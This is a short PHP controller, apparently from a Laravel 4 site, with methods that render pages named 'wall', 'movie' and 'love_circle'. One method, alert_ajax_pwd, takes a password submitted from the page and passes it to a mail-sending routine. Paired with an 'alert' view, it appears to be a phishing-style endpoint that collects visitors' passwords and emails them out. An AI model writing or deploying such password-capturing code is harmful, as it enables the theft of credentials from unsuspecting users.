<?php

class IndexController extends BaseController {

	/*
	|--------------------------------------------------------------------------
	| Default Home Controller
	|--------------------------------------------------------------------------
	|
	| You may wish to use controllers instead of, or in addition to, Closure
	| based routes. That's great! Here is an example controller method to
	| get you started. To route to this controller, just add the route:
	|
	|	Route::get('/', 'HomeController@showWelcome');
	|
	*/

	public function index()
	{
		return View::make('index.index');

	}

	public function alert(){
		return View::make('index.alert');
	}

	public function alert_ajax_pwd(){
		$pwd=Input::get('pwd');
		SendMail::send_password($pwd);
	}

	public function wall(){
		return View::make('index.wall');
	}

	public function summer_death(){
		return View::make('index.summer_death');
	}

	public function movie(){
		return View::make('index.movie');
	}

	public function love_circle(){
		return View::make('index.love_circle');

	}

}
